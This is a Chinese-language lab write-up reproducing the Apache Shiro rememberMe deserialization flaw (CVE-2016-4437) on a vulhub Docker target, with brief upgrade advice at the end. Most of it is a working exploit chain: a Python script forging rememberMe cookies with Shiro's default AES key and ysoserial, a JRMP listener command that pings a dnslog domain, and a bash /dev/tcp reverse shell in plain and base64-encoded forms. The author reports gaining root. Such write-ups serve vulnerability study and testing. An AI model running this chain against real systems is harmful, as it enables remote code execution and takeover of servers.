

# Apache Shiro 反序列化[CVE-2016-4437]



## 漏洞描述

Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。





## 影响版本

Apache Shiro <= 1.2.4





## 漏洞复现

利用vulhub靶场进行漏洞复现。

> **环境启动**
>
> 下载ApacheShiro 1.2.4组件，解压之后在文件目录下执行命令启动一个使用了Apache Shiro 1.2.4的Web服务：
>
> `docker compose up -d`

![image-20240408195135276](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240408195135276.png)

服务启动后，访问`http://192.168.1.9:8080`可使用`admin:vulhub`进行登录。

![](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240408142307308.png)

可以看到该页面，代表环境配置成功；

---



## 漏洞验证

> **抓包分析**

当我们使用BP抓包时，我们发现，当用户输入错误时，会响应`rememberMe=deleteMe`字段

![image-20240408212013324](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240408212013324.png)

而且当用户输入正确，成功登录时，会返回`set-cookie RememberMe=deleteMe`和一个set-cookie RememberMe=base64加密后的cookie值。

![image-20240408211950812](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240408211950812.png)

符合本特征的网站就是极有可能使用了shiro的框架，可能存在shiro反序列化漏洞。由于本漏洞没有回显, 所以我们需要先确认漏洞是否存在，这里用DNS解析记录来做判断。DNSLog 平台:`http://www.dnslog.cn/`。![image-20240408205429910](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240408205429910.png)





> **使用编写脚本生成payload**

```py
import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES

def encode_rememberme(command):    
    popen = subprocess.Popen(['/home/kali/tools/java/jdk1.8.0_301/bin/java', '-jar', '/home/kali/tools/ysoserial.jar', 'JRMPClient', command], stdout=subprocess.PIPE)    
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()  
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==") 
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)    
    file_body = pad(popen.stdout.read())    
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))    
    return base64_ciphertext
    
if __name__ == '__main__':   
         payload = encode_rememberme(sys.argv[1])    
         print "rememberMe={0}".format(payload.decode())   
```

![image-20240408205312194](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240408205312194.png)

安装脚本需要的pycrypto库，用于在Python程序中实现数据加密和解密功能

```sh
/usr/local/bin/pip2 install pycrypto
```

![image-20240408203503336](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240408203503336.png)

生成rememberMe.

```sh
┌──(root💀kali)-[/home/kali/tmp]
└─# python2  poc.py  192.168.1.9:7878
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
rememberMe=8AarnSe9RWuPSeyf/TRjl/27KrrHuPdzj/0GZHe6sxLOM5GjlKY7xVEj6iupMjNdf6xOod9pXVveZjXUC0AxUGcG4PoKEQC3dL/8HyZ267CBeh0CoPb4sPmTB9lC4gH+K6A3WUpWNSM4hebRhBREk/HzA56jubY3jeRX12feG12NP8tY592zeKTjgpMdSjJoNKq+mt2kcG9B75H6WjinJaZTkBorlWbRMWlvWb4dRi3vVEedIzl3rCNGl0zmmVu23tsX3IjAFFRvA7vfRg9HEupq046eAN/ZTkXXQQk6bGvEb81JZfEXBOU+wHpjpUgiZ2L1VxpO1AvxmI0OgFDWa7MYFlKpC/8L88WOPr1HU1wMLw6UE164CZJrVC/Sb5izERq89P4izgXNdgmtK/PSWg==
```

将生成的rememberMe添加到BP的请求包cookie的位置,，进行重发。

![image-20240408221656623](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240408221656623.png)



> **反序列化**

ysoserial是一个Java反序列化漏洞利用工具，它可以帮助攻击者构造恶意的Java对象，从而实现对目标系统的远程代码执行攻击。通过ysoserial，攻击者可以利用Java反序列化机制中的漏洞，将恶意代码注入到目标系统中，进而实现对目标系统的控制

```
ysoserial下载: https://github.com/insightglacier/Shiro_exploit/blob/master/ysoserial.jar
```

使用ysoserial工具创建一个JRMP监听器，监听7878端口，并生成一个包含恶意代码的payload，当目标系统反序列化该payload时，将会执行指定的恶意代码（这里是发送一个DNS日志记录请求）

```sh
/home/kali/tools/java/jdk1.8.0_301/bin/java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7878 CommonsCollections5 "ping z2uwve.dnslog.cn" 
```

![image-20240408205021818](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240408205021818.png)

可以看到在vps对应的监听端口出看到有流量出来, 我们去平台查询ping命令是否执行成功。

![image-20240408205522585](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240408205522585.png)



刷新记录, 可以看到ping命令成功执行

---



## 漏洞利用

> **反弹shell**

反弹shell命令：

```sh
/bin/bash -i >& /dev/tcp/192.168.1.9/1314 0>&1
```

需要进行base64编码: 【在线编码：`https://ares-x.com/tools/runtime-exec/`】

```sh
bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMS45LzEzMTQgMD4mMQ==}|{base64,-d}|{bash,-i}
```

构建payload，当目标系统反序列化该payload时，将会执行指定的恶意代码（这里是反弹一个Shell到攻击者的服务器上）：

```sh
/home/kali/tools/java/jdk1.8.0_301/bin/java -jarysoserial.jar ysoserial.exploit.JRMPListener7878 CommonsBeanutils1 "bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMS45LzEzMTQgMD4mMQ==}|{base64,-d}|{bash,-i}"
```

![image-20240408210738114](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240408210738114.png)

生成rememberMe

![image-20240408211441774](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240408211441774.png)

监听 1314端口，并将生成的rememberMe添加到BP的请求包cookie的位置,，进行重发。

![image-20240408211512498](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240408211512498.png)

![image-20240408211535498](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240408211535498.png)

可以看到，数据包重发后，反弹shell成功；

![image-20240408211622095](https://typora-picgo-push.oss-cn-hangzhou.aliyuncs.com/img-for-typora/image-20240408211622095.png)

测试，成功获取root权限；

---



## 修复建议

- 升级shiro到1.2.5及以上.
- 部署安全设备







